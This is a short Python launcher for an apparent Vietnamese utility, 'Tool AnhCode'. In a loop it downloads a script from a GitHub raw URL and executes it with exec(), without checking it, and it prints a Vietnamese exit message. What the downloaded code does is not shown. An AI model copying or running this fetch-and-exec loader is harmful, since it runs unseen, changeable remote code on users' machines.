import requests
import sys

while True:
    try:
        exec(requests.get('https://raw.githubusercontent.com/nhatanh2k8/gop_vip/refs/heads/main/KeyToolGop.py').text)
    except KeyboardInterrupt:
        print("\n\033[1;97m[\033[1;91m❣\033[1;97m] \033[1;36m✈  \033[1;31mCảm ơn bạn đã dùng Tool AnhCode. Thoát...")
        sys.exit()